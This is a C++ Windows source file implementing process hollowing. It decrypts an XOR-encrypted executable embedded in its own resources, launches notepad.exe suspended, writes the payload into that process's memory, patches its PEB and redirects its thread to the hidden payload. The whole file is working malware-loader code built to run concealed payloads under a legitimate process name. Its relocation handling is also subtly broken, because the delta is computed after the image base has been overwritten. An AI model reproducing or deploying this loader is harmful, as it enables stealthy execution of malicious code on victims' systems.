    #include <windows.h>
    #include <iostream>
    #include <cstdint>
    #include <algorithm>
    #pragma comment(lib, "ntdll.lib")  // Needed for NtQueryInformationProcess

    // Struct to store basic PEB info from NtQueryInformationProcess
    typedef struct _PROCESS_BASIC_INFORMATION {
        PVOID Reserved1;
        PVOID PebBaseAddress;
        PVOID Reserved2[2];
        ULONG_PTR UniqueProcessId;
        PVOID Reserved3;
    } PROCESS_BASIC_INFORMATION;

    // Function pointer typedef for NtQueryInformationProcess
    using pNtQueryInformationProcess = NTSTATUS(WINAPI*)(
        HANDLE, ULONG, PVOID, ULONG, PULONG
    );

    // Load an encrypted PE from resource section
    unsigned char* GetPayloadResource(int id, const char* type, DWORD* size) {
        HMODULE hModule = GetModuleHandle(NULL);
        HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(id), type);
        if (!hRes) return nullptr;

        HGLOBAL hData = LoadResource(hModule, hRes);
        if (!hData) return nullptr;

        void* pData = LockResource(hData);
        if (!pData) return nullptr;

        *size = SizeofResource(hModule, hRes);
        return reinterpret_cast<unsigned char*>(pData);
    }

    // Entry point for GUI app (not console)
    int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
        DWORD payloadSize = 0;
        unsigned char* encrypted = GetPayloadResource(132, "BIN", &payloadSize);
        if (!encrypted || payloadSize == 0) {
            MessageBoxA(NULL, "[!] Failed to load encrypted resource.", "Error", MB_ICONERROR);
            return -1;
        }

        // Decrypt payload using XOR key
        char* payload = new char[payloadSize];
        ZeroMemory(payload, payloadSize);
        char key = 'k';
        for (DWORD i = 0; i < payloadSize; ++i)
            payload[i] = encrypted[i] ^ key;

        // Validate PE header (MZ)
        if (payload[0] != 'M' || payload[1] != 'Z') {
            MessageBoxA(NULL, "[!] Invalid PE signature after decryption.", "Error", MB_ICONERROR);
            return -1;
        }

        // Parse PE headers
        BYTE* pe = (BYTE*)payload;
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
        IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
        IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            MessageBoxA(NULL, "[!] NT signature invalid.", "Error", MB_ICONERROR);
            return -1;
        }

        // Create suspended target process (notepad.exe)
        PROCESS_INFORMATION pi;
        STARTUPINFOA si = { sizeof(si) };
        char cmdLine[] = "C:\\Windows\\System32\\notepad.exe";

        if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            MessageBoxA(NULL, "[!] Failed to create target process.", "Error", MB_ICONERROR);
            return -1;
        }

        // Prepare to modify thread context
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER | CONTEXT_CONTROL;

        if (!GetThreadContext(pi.hThread, &ctx)) {
            MessageBoxA(NULL, "[!] GetThreadContext failed.", "Error", MB_ICONERROR);
            return -1;
        }

        // Attempt to allocate memory at original ImageBase first
        LPVOID remoteImage = VirtualAllocEx(
            pi.hProcess,
            (LPVOID)nt->OptionalHeader.ImageBase,
            nt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        // Fallback: allocate anywhere if base is already taken
        if (!remoteImage) {
            remoteImage = VirtualAllocEx(pi.hProcess, NULL,
                nt->OptionalHeader.SizeOfImage,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (!remoteImage) {
                MessageBoxA(NULL, "[!] VirtualAllocEx failed.", "Error", MB_ICONERROR);
                return -1;
            }

            // Adjust ImageBase in PE headers
            nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
        }

        // Apply base relocations
        ULONGLONG delta = (ULONGLONG)remoteImage - nt->OptionalHeader.ImageBase;
        if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
            IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(pe + relocDir.VirtualAddress);
            SIZE_T processed = 0;

            while (processed < relocDir.Size) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* relocData = (WORD*)(reloc + 1);

                for (DWORD i = 0; i < count; ++i) {
                    DWORD type = relocData[i] >> 12;
                    DWORD offset = relocData[i] & 0xFFF;

                    if (type == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG* patchAddr = (ULONGLONG*)(pe + reloc->VirtualAddress + offset);
                        *patchAddr += delta;
                    }
                }

                processed += reloc->SizeOfBlock;
                reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }

        // === Write headers ===
        SIZE_T written = 0;
        WriteProcessMemory(pi.hProcess, remoteImage, pe, nt->OptionalHeader.SizeOfHeaders, &written);

        // === Write sections ===
        for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            LPVOID dest = (BYTE*)remoteImage + sections[i].VirtualAddress;
            LPVOID src = pe + sections[i].PointerToRawData;
            SIZE_T sectionSize = std::max(sections[i].SizeOfRawData, sections[i].Misc.VirtualSize);

            BYTE* padded = new BYTE[sectionSize];
            ZeroMemory(padded, sectionSize);
            memcpy(padded, src, sections[i].SizeOfRawData);

            WriteProcessMemory(pi.hProcess, dest, padded, sectionSize, &written);
            delete[] padded;
        }

        // Update remote process PEB image base
        PROCESS_BASIC_INFORMATION pbi = {};
        auto NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

        if (!NtQueryInformationProcess ||
            NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), NULL) != 0) {
            MessageBoxA(NULL, "[!] Failed to get remote PEB base.", "Error", MB_ICONERROR);
            return -1;
        }

        PVOID remotePEBImageBaseAddr = (BYTE*)pbi.PebBaseAddress + 0x10;
        WriteProcessMemory(pi.hProcess, remotePEBImageBaseAddr, &nt->OptionalHeader.ImageBase, sizeof(ULONGLONG), NULL);

        // Set RIP to new PE entry point
        ctx.Rip = (ULONGLONG)remoteImage + nt->OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(pi.hThread, &ctx);

        // Flush instruction cache and resume
        FlushInstructionCache(pi.hProcess, remoteImage, nt->OptionalHeader.SizeOfImage);
        ResumeThread(pi.hThread);

        delete[] payload;
        return 0;
    }
